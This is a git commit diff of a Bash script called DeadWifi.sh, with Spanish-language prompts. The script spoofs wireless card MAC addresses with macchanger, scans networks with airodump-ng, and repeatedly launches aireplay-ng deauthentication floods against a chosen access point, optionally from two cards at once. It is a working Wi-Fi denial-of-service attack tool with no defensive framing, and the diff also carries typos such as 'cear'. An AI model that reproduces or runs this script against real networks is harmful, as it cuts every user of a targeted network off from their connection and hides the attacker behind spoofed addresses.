d1f25e766bfc1db6750afad41e7e30360b7e3cea
David <sotodelanoche@gmail.com>
2019-01-13 00:10:09 +0000

    Update DeadWifi.sh

--- DeadWifi.sh
+++ DeadWifi.sh
@@ -34,65 +34,68 @@ read -n 1 -p "pulsa una opción:
             
               3) Dead wifi
              
-              4) Exit" tecla
+              4) Exit 
+                
+                selec   " tecla
 
 case $tecla in 
 
 
 1)
+
+clear
 ifconfig
 read -p "Seleccione tarjeta de red:" wlanA
+
 export $wlanA
 ifconfig $wlanA down 
 macchanger -A $wlanA 
-ifconfig  up 
+ifconfig  $wlanA up 
+
 
 read -p "Desea selecionar otra Wlan más para el ataque Si=Y No=N:" evalua
+
 if [ "$aceptar" = "$evalua" ]
 then
-echo "Tarjeta 1º $wlanA"
+echo ""
 read -p "Seleccione tarjeta de red 2º:" wlanB
 export $wlanB
 ifconfig $wlanB down 
 macchanger -A $wlanB 
-ifconfig  up 
+ifconfig  $wlanB up 
 echo -e "${red} Ataque Harcore Rock"
 Rock="1"
+
 else
 echo -e "${blue} No secciono una 2º tarjeta ataque"
 Rock="0"
-fi 
-sleep 3
+sleep 1
 cear 
-figlet Dead Wifi;;
+figlet Dead Wifi
+fi;;
 
-2)
-x-terminal-emulator -e "bash -c \" airodump-ng $wlanA;exec bash\"" 
-sleep 2
-cear 
-figlet Dead Wifi;;
+
+2)x-terminal-emulator -e "bash -c \" airodump-ng $wlanA;exec bash\"" ;;
 
 3) 
 IFS=","
 echo ""
-read -p "Seleccione MAC, Número de ataque y canal separe con , :" MAC numero canal
+read -p "Seleccione MAC,canal y Número de ataques separe con , :" MAC canal numero
 x-terminal-emulator -e "bash -c \" airodump-ng -c $canal $wlanA;exec bash\""
-sleep 3
+sleep 1
+
 for(( a=1; a <= $numero; a++))
 do
-echo -e "$a Numero de Ataques \n"
 x-terminal-emulator -e "bash -c \"aireplay-ng -0 0 -a $MAC $wlanA; exec bash\""
 if  [ "$Rock" = "1" ]
 then
 x-terminal-emulator -e "bash -c \"aireplay-ng -0 0 -a $MAC $wlanB; exec bash\""
 fi
-done
-sleep 3
-cear 
-figlet Dead Wifi;;
+done;;
 
 esac
 done
+cear 
+figlet Dead Wifi
 echo ""
 echo -e  "${red}Siempre A"
-
